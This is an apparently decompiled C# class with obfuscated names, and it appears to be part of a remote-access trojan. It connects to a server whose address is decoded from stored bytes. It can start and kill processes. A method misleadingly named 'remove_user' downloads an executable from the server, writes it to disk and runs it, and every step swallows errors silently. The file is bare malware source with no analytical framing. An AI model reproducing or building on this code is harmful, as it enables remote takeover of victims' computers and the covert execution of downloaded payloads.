using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace igtmntina;

internal class OAKAMR
{
	public MAKEDM server;

	public NetworkStream igtmntinaNS(TcpClient igtmntinatcpsck)
	{
		return igtmntinatcpsck.GetStream();
	}

	public void igtmntinado_process(string filePath)
	{
		try
		{
			Process.Start(filePath.ToString());
		}
		catch
		{
		}
	}

	public void igtmntinabreak_process(int proid)
	{
		try
		{
			Thread.Sleep(11);
			Process.GetProcessById(proid).Kill();
		}
		catch
		{
		}
	}

	public void igtmntinaremove_user()
	{
		try
		{
			if (!File.Exists(DAAONIF.igtmntinaget_mpath() + DAAONIF.igtmntinaremvUser + ".exe".ToString()))
			{
				File.WriteAllBytes(DAAONIF.igtmntinaget_mpath() + DAAONIF.igtmntinaremvUser + ".exe".ToString(), server.igtmntinapull_data());
				igtmntinado_process(DAAONIF.igtmntinaget_mpath() + DAAONIF.igtmntinaremvUser + ".exe".ToString());
			}
		}
		catch
		{
		}
	}

	public string igtmntinaserverIPD()
	{
		return Encoding.UTF8.GetString(DAAONIF.igtmntinavpsips, 0, DAAONIF.igtmntinavpsips.Length);
	}

	public OAKAMR(MAKEDM lID)
	{
		server = lID;
	}
}
